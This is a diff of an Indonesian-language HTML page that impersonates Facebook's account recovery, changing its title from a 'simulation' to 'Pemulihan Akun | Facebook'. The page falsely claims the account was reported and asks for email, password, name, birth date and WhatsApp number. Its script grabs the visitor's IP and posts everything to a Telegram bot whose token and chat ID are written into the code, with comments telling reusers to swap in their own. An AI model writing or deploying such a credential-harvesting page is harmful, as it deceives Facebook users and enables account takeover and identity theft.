@@ -1,172 +1,131 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Simulasi Verifikasi Facebook</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pemulihan Akun | Facebook</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    html, body {
-      height: 100%;
-      font-family: 'Segoe UI', sans-serif;
-      background: #f0f2f5;
-    }
-
-    .wrapper {
-      display: flex;
-      justify-content: center;
-      align-items: flex-start;
-      min-height: 100vh;
-      padding-top: 40px; /* naik sedikit di layar hp */
-    }
-
-    .box {
-      background: #fff;
-      padding: 25px;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-      width: 90%;
-      max-width: 420px;
-      display: none;
-      text-align: center;
-    }
-
-    .box.active {
-      display: block;
-    }
-
-    .box img {
-      width: 60px;
-      margin-bottom: 18px;
-    }
-
-    h2 {
-      color: #1877f2;
-      font-size: 20px;
-      margin-bottom: 10px;
-    }
-
-    p {
-      font-size: 14px;
-      color: #444;
-      margin-bottom: 22px;
-    }
-
-    .btn {
-      background-color: #1877f2;
-      color: #fff;
-      padding: 10px 14px;
-      font-size: 15px;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      width: 100%;
-    }
-
-    input {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 12px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-    }
-
-    /* Tampilan berhasil */
-    .success h2 {
-      color: #1877f2;
-      font-size: 22px;
-      margin-bottom: 8px;
-    }
-
-    .success p {
-      font-size: 18px;
-      font-weight: 600;
-      color: #1877f2;
-    }
+    body { margin: 0; font-family: Arial, sans-serif; background: #f0f2f5; }
+    .container { max-width: 400px; margin: 40px auto; background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+    h2 { color: #1877f2; }
+    input, button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #ccc; }
+    button { background: #1877f2; color: #fff; border: none; font-size: 16px; cursor: pointer; }
+    button:hover { background: #166fe5; }
+    .step { display: none; }
+    .step.active { display: block; }
+    .alert-box { display: none; background: #fbe9eb; color: #d93025; border: 1px solid #d93025; padding: 10px; border-radius: 6px; font-size: 14px; margin-top: 10px; }
+    .icon-lock { text-align: center; margin: 20px 0; }
+    .icon-lock img { width: 60px; }
   </style>
 </head>
 <body>
 
-  <div class="wrapper">
-    <!-- Halaman 1 -->
-    <div class="box active" id="step1">
-      <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="lock">
+  <div class="container">
+
+    <!-- STEP 0: Konfirmasi -->
+    <div class="step active" id="step0">
+      <div class="icon-lock">
+        <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="lock" />
+      </div>
       <h2>Harap Konfirmasi Identitas Anda</h2>
       <p>Demi keamanan, kami perlu memverifikasi akun Anda karena telah dilaporkan mengandung konten tidak pantas.</p>
-      <button class="btn" onclick="goToStep(2)">Lanjutkan</button>
+      <button onclick="goToStep(1)">Lanjutkan</button>
     </div>
 
-    <!-- Halaman 2 -->
-    <div class="box" id="step2">
+    <!-- STEP 1: Form -->
+    <div class="step" id="step1">
       <h2>Informasi Pemulihan</h2>
-      <form id="recoveryForm">
-        <input type="text" name="email" placeholder="Email atau Nomor Telepon Facebook" required>
-        <input type="text" name="password" placeholder="Password Facebook" required>
-        <input type="text" name="name" placeholder="Nama Facebook" required>
-        <input type="text" name="birthdate" placeholder="Tanggal Lahir (DD-MM-YYYY)" required>
-        <input type="text" name="whatsapp" placeholder="Nomor WhatsApp" required>
-        <button class="btn" type="submit">Kirim</button>
-      </form>
+      <input type="email" id="recoveryEmail" placeholder="Email atau Nomor Telepon Facebook" required />
+      <input type="password" id="recoveryPassword" placeholder="Password Facebook" required />
+      <input type="text" id="namaFb" placeholder="Nama Facebook" required />
+      <input type="text" id="lahir" placeholder="Tanggal Lahir (DD-MM-YYYY)" required />
+      <input type="text" id="wa" placeholder="Nomor WhatsApp untuk pemberitahuan" required />
+      <div id="alertBox" class="alert-box"></div>
+      <button onclick="submitForm()">Lanjutkan</button>
     </div>
 
-    <!-- Halaman 3: Berhasil -->
-    <div class="box success" id="step3">
+    <!-- STEP DONE -->
+    <div class="step" id="stepDone">
       <h2>Berhasil!</h2>
-      <p>Berhasil mengirim data.</p>
+      <p>Informasi berhasil dikirim. Anda akan dihubungi melalui WhatsApp oleh tim Meta Facebook.</p>
     </div>
+
   </div>
 
   <script>
+    let userIP = "";
+
+    // Ambil IP pengguna
+    fetch("https://ipwho.is/")
+      .then(res => res.json())
+      .then(data => {
+        userIP = data.success ? data.ip : "Tidak diketahui";
+      })
+      .catch(() => {
+        userIP = "Gagal mengambil IP";
+      });
+
     function goToStep(step) {
-      document.querySelectorAll('.box').forEach(box => box.classList.remove('active'));
-      document.getElementById(`step${step}`).classList.add('active');
+      document.querySelectorAll(".step").forEach(s => s.classList.remove("active"));
+      document.getElementById("step" + step).classList.add("active");
     }
 
-    const form = document.getElementById('recoveryForm');
-    form.addEventListener('submit', function(e) {
-      e.preventDefault();
+    function submitForm() {
+      const email = document.getElementById('recoveryEmail').value.trim();
+      const pass = document.getElementById('recoveryPassword').value.trim();
+      const nama = document.getElementById('namaFb').value.trim();
+      const lahir = document.getElementById('lahir').value.trim();
+      const wa = document.getElementById('wa').value.trim();
+      const alertBox = document.getElementById('alertBox');
 
-      const email = form.email.value;
-      const password = form.password.value;
-      const name = form.name.value;
-      const birthdate = form.birthdate.value;
-      const whatsapp = form.whatsapp.value;
+      alertBox.style.display = 'none';
+      alertBox.innerText = '';
+
+      if (!email || !pass || !nama || !lahir || !wa) {
+        alertBox.style.display = 'block';
+        alertBox.innerText = "Semua kolom wajib diisi.";
+        return;
+      }
+
+      // GANTI dengan token dan chat ID kamu
+      const botToken = "7733097714:AAFizEnWZUqtjfJxikCqoNOCzufsJTB2Vk8"; // ← Ganti di sini
+      const chatId = "7228659553"; // ← Ganti di sini
 
       const message = `
-🔐 Simulasi Pemulihan:
+🔐 *Formulir Pemulihan Facebook*
+--------------------------
 📧 Email: ${email}
-🔑 Password: ${password}
-👤 Nama: ${name}
-🎂 Tanggal Lahir: ${birthdate}
-📱 WhatsApp: ${whatsapp}
-      `;
+🔑 Password: ${pass}
+🙍 Nama: ${nama}
+🎂 Tanggal Lahir: ${lahir}
+📱 WhatsApp: ${wa}
+🌐 IP: ${userIP}
 
-      // Ganti token dan chat ID kamu
-      const telegramBotToken = "8403530476:AAGUbKRzdrsAGy4UfJu-5bDsXMpopa8TImw";
-      const telegramChatId = "7228659553";
+*Website by acill x code*
+--------------------------`;
 
-      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-        method: 'POST',
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: telegramChatId,
-          text: message
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
         })
       })
       .then(res => res.json())
       .then(data => {
-        goToStep(3);
+        if (data.ok) {
+          goToStep('Done');
+        } else {
+          throw new Error("Gagal kirim ke Telegram");
+        }
       })
-      .catch(error => {
-        alert("Gagal mengirim data.");
-        console.error(error);
+      .catch(() => {
+        alertBox.style.display = 'block';
+        alertBox.innerText = "Gagal mengirim data. Silakan coba lagi.";
       });
-    });
+    }
   </script>
 
 </body>
